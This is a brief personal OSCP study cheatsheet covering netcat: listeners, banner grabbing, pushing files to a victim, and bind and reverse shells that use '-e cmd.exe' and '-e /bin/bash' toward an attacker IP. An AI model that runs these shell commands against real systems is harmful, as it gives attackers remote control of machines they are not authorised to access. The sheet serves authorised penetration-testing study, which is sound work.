# OSCP cheatsheet
Cheatsheet for my OSCP labs / exam.

# Index

- [Introduction](#introduction) 

# Content

### ============================================================
### Introduction
### ============================================================


### ============================================================
### Essential Tools
### ============================================================

**Netcat**  
Basics
```bash
nc -nlvp [port]          # set up listener
nc -nv [IP] [port]       # banner grabbing OR connect to remote port
```
File Transfer
```bash
nc -nlvp [port] > incoming.exe          # VIC: set up listener, direct data to incoming.exe
nc -nv [IP] [port] < /path/to/wget.exe  # ATT: push wget.exe file to VIC
```
Bind Shell: bind executable (e.g. cmd.exe) to a local port (typically victim machine)
```bash
nc -nlvp [port] -e cmd.exe  # VIC: set up listener + bind cmd.exe to local port
nc -nv [VIC IP] [port]   # ATT: attacker connects and is presented with cmd prompt
```
Reverse Shell: victim box connect to attacker box
```bash
nc -nvlp [port]                       # ATT: attacker set up listener
nc -nv [ATT IP] [port] -e /bin/bash   # VIC: attacker sends reverse shell to their box
```






